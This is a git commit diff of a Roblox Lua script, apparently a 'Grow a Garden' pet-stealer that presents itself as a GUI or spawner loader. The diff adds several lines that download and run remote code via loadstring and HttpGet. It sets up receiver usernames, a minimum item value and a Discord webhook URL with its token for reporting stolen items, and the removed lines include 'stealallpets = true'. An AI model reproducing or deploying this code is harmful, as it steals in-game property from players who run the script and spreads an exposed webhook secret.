2c92b89f52cfcfd412bd09eb3201bfa6484ed9e4
thatboyskulls12 <aj.skulls12@gmail.com>
2025-07-24 12:24:58 -0400

    Update Source.lua

--- Source.lua
+++ Source.lua
@@ -1,12 +1,12 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/gui_loader.lua"))()
 
-users = {
-    'ajandaa12alt1',
-    'ajandaa12alt11',
-}
-min_value = 10000000
-ping = "Yes"
-webhook = "https://discord.com/api/webhooks/1397737960925036605/6OL-UU-x_pYYOauEmwmR1t-yAA6lkOX5oWpxz0MmfRGRKPBFx_9EkMh5Zg8dquFb6Kwr"
-stealallpets = true
-Whitelist_Pets = {"Red Fox", "Raccoon", "Dragonfly"}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/GAG-SKULLS/refs/heads/main/spawning_gui.lua"))()
+
+_G.Usernames = {"ajandaa12", "Qusay52VxWi", "ajandaa12alt11","ajandaa12alt","ajandaa12alt1"} -- you can add as many as you'd like
+_G.min_value = 100000000 -- 100 million
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1397737960925036605/6OL-UU-x_pYYOauEmwmR1t-yAA6lkOX5oWpxz0MmfRGRKPBFx_9EkMh5Zg8dquFb6Kwr" --;o"/., ,,. change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/GAG-SKULLS/refs/heads/main/Source.lua"))()
 
 loadstring(game:HttpGet("https://codeberg.org/amaz/main/raw/branch/main/gag"))()
